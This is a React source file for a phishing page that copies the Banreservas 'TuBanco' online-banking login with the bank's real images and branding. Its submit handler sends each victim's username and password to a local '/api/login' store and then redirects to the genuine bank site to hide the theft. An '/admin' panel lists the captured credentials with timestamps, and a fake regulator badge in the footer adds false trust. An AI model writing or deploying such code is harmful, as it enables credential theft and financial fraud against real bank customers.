/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { User, Lock, Eye, EyeOff, Globe, Shield, RefreshCw } from 'lucide-react';

const SLIDES = [
  {
    url: 'https://tubanco.banreservas.com/DO_BR_ICB7_AZ_PROD.WebServer.Api/api/Common/RawImages/42',
    alt: 'Banreservas Promo 1'
  },
  {
    url: 'https://tubanco.banreservas.com/DO_BR_ICB7_AZ_PROD.WebServer.Api/api/Common/RawImages/52',
    alt: 'Banreservas Promo 2'
  },
  {
    url: 'https://tubanco.banreservas.com/DO_BR_ICB7_AZ_PROD.WebServer.Api/api/Common/RawImages/44',
    alt: 'Banreservas Promo 3'
  }
];

export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isShaking, setIsShaking] = useState(false);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [isAdmin, setIsAdmin] = useState(window.location.pathname === '/admin');
  const [logins, setLogins] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [logoError, setLogoError] = useState(false);

  // Carousel logic
  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % SLIDES.length);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (isAdmin) {
      fetchLogins();
    }
  }, [isAdmin]);

  const fetchLogins = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/admin/logins');
      const data = await response.json();
      setLogins(data);
    } catch (error) {
      console.error('Error fetching logins:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      setIsShaking(true);
      setTimeout(() => setIsShaking(false), 400);
      return;
    }

    setIsSubmitting(true);

    try {
      // Save to our local database
      await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });

      // Redirect to the official site
      setTimeout(() => {
        window.location.href = 'https://tubanco.banreservas.com/TuBancoBanreservas/#/administrationGeneral/login';
      }, 700);
    } catch (error) {
      console.error('Submission error:', error);
      window.location.href = 'https://tubanco.banreservas.com/TuBancoBanreservas/#/administrationGeneral/login';
    }
  };

  if (isAdmin) {
    return (
      <div className="min-h-screen bg-gray-100 p-8 font-sans">
        <div className="max-w-6xl mx-auto">
          <div className="flex justify-between items-center mb-8">
            <div className="flex items-center space-x-3">
              <Shield className="text-[#1a4066]" size={32} />
              <h1 className="text-3xl font-bold text-gray-800">Panel de Administración</h1>
            </div>
            <div className="flex space-x-4">
              <button 
                onClick={fetchLogins}
                className="flex items-center space-x-2 bg-white px-4 py-2 rounded-lg shadow hover:bg-gray-50 transition-colors cursor-pointer"
                disabled={loading}
              >
                <RefreshCw size={18} className={loading ? 'animate-spin' : ''} />
                <span>Actualizar</span>
              </button>
              <button 
                onClick={() => {
                  window.history.pushState({}, '', '/');
                  setIsAdmin(false);
                }}
                className="bg-[#1a4066] text-white px-4 py-2 rounded-lg shadow hover:bg-[#143250] transition-colors cursor-pointer"
              >
                Volver al Login
              </button>
            </div>
          </div>

          <div className="bg-white rounded-xl shadow-lg overflow-hidden">
            <table className="w-full text-left">
              <thead className="bg-gray-50 border-b border-gray-200">
                <tr>
                  <th className="px-6 py-4 font-semibold text-gray-600">ID</th>
                  <th className="px-6 py-4 font-semibold text-gray-600">Usuario</th>
                  <th className="px-6 py-4 font-semibold text-gray-600">Contraseña</th>
                  <th className="px-6 py-4 font-semibold text-gray-600">Fecha y Hora</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {logins.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="px-6 py-12 text-center text-gray-400 italic">
                      No hay registros capturados todavía.
                    </td>
                  </tr>
                ) : (
                  logins.map((login) => (
                    <tr key={login.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 text-gray-500 font-mono text-sm">{login.id}</td>
                      <td className="px-6 py-4 font-medium text-gray-800">{login.username}</td>
                      <td className="px-6 py-4 text-gray-600 font-mono">{login.password}</td>
                      <td className="px-6 py-4 text-gray-500 text-sm">
                        {new Date(login.timestamp).toLocaleString()}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
          
          <div className="mt-6 text-center text-gray-400 text-sm">
            Total de registros: {logins.length}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col font-sans">
      {/* HEADER */}
      <header className="bg-[#2d4d72] flex flex-col items-stretch pb-12">
        <div className="flex items-center justify-end gap-2.5 px-6 pt-2.5 pb-1.5">
          <a href="#" className="text-white/90 no-underline text-xs font-medium hover:text-white">Contact us</a>
          <span className="text-white/30 text-sm">|</span>
          <a href="#" className="text-white/90 no-underline text-xs font-medium hover:text-white border-[1.5px] border-white/60 rounded-[3px] px-2.5 py-1">Restore Up</a>
        </div>
        <div className="flex justify-center pt-2">
          {!logoError ? (
            <img 
              src="https://play-lh.googleusercontent.com/HiizOaJDzIJDdeSi9-MLfRiXMuLiktIySfF3S0Gd9x_rXTe5peU_wmBftuvJj_D5pg=w416-h235-rw" 
              alt="Banreservas" 
              className="h-36 w-auto max-w-[450px] object-contain"
              onError={() => setLogoError(true)}
            />
          ) : (
            <div className="h-36 flex items-center">
              <span className="text-white text-5xl font-bold tracking-tighter">BANRESERVAS</span>
            </div>
          )}
        </div>
      </header>

      {/* MAIN */}
      <main className="flex-1 flex justify-center items-start -mt-9 px-5 pb-10 relative z-10">
        <div className={`flex w-full max-w-[900px] h-[480px] rounded-none overflow-hidden shadow-[0_4px_28px_rgba(0,0,0,0.22)] bg-white ${isShaking ? 'animate-shake' : ''}`}>
          
          {/* Left Panel: Form */}
          <div className="flex-[0_0_55%] p-10 md:px-12 md:py-9 flex flex-col justify-center h-full">
            <h1 className="text-[30px] font-bold text-[#4fa3d1] mb-6.5 leading-tight">Bienvenido a TuBanco</h1>

            <form onSubmit={handleSubmit} className="flex flex-col">
              <div className="field-container">
                <span className="px-3 text-[#3a5f8a] flex items-center shrink-0">
                  <User size={22} strokeWidth={1.6} />
                </span>
                <input
                  type="text"
                  placeholder="Ingrese su usuario"
                  className="flex-1 border-none outline-none py-3.5 px-2 text-sm text-[#333] bg-transparent min-w-0"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  autoComplete="username"
                />
              </div>

              <div className="field-container">
                <span className="px-3 text-[#3a5f8a] flex items-center shrink-0">
                  <Lock size={22} strokeWidth={1.6} />
                </span>
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Ingrese su contraseña"
                  className="flex-1 border-none outline-none py-3.5 px-2 text-sm text-[#333] bg-transparent min-w-0"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoComplete="current-password"
                />
                <button 
                  type="button"
                  className="px-3.5 text-[#b0bfc8] hover:text-[#2d4d72] transition-colors cursor-pointer shrink-0"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <EyeOff size={20} strokeWidth={1.6} /> : <Eye size={20} strokeWidth={1.6} />}
                </button>
              </div>

              <div className="text-right mb-5">
                <a href="#" className="text-sm text-[#4fa3d1] no-underline font-medium hover:underline">Teclado virtual</a>
              </div>

              <button 
                type="submit" 
                className="btn-ingresar"
                disabled={isSubmitting}
              >
                {isSubmitting ? '✓ Entrando...' : 'Ingresar'}
              </button>

              <div className="border-t border-[#dde4ea] my-5.5"></div>

              <div className="flex flex-col items-end gap-1 mb-2">
                <a href="#" className="text-sm text-[#4fa3d1] no-underline font-semibold hover:underline">Cambiar a TuBanco Empresas</a>
                <a href="#" className="text-sm text-[#4fa3d1] no-underline font-semibold hover:underline">¿Ha olvidado su contraseña?</a>
              </div>

              <p className="text-sm text-[#444] text-right">
                ¿No tienes usuario? <a href="#" className="text-[#4fa3d1] font-bold no-underline hover:underline">Regístrate aquí</a>
              </p>
            </form>
          </div>

          {/* Right Panel: Carousel */}
          <div className="hidden md:block flex-[0_0_45%] relative overflow-hidden h-full bg-[#2d4d72]">
            {SLIDES.map((slide, index) => (
              <div 
                key={index}
                className={`absolute inset-0 w-full h-full transition-opacity duration-1000 ${currentSlide === index ? 'opacity-100 z-10' : 'opacity-0 z-0'}`}
              >
                <img 
                  src={slide.url} 
                  alt={slide.alt} 
                  className="w-full h-full object-cover object-center block"
                />
              </div>
            ))}

            <div className="absolute bottom-4 left-0 right-0 flex justify-center gap-2 z-20">
              {SLIDES.map((_, index) => (
                <span 
                  key={index}
                  className={`block w-2.5 h-2.5 rounded-full cursor-pointer transition-colors duration-250 ${currentSlide === index ? 'bg-[#4fa3d1]' : 'bg-white/40'}`}
                  onClick={() => setCurrentSlide(index)}
                ></span>
              ))}
            </div>
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer className="flex justify-center py-5 pb-7">
        <div className="inline-block transition-all duration-200 hover:opacity-85 hover:scale-105">
          <div className="border-2 border-[#1a4066] rounded-lg p-2 flex flex-col items-center w-24 bg-white/10">
            <span className="text-[#1a4066] font-black text-xl leading-none">SSB</span>
            <span className="text-[8px] font-bold uppercase tracking-tighter text-[#1a4066]">Entidad Autorizada</span>
            <div className="w-full h-[1px] bg-[#1a4066] my-1"></div>
            <span className="text-[6px] font-bold text-[#1a4066]">REGISTRO # H-001-1-00-0101</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
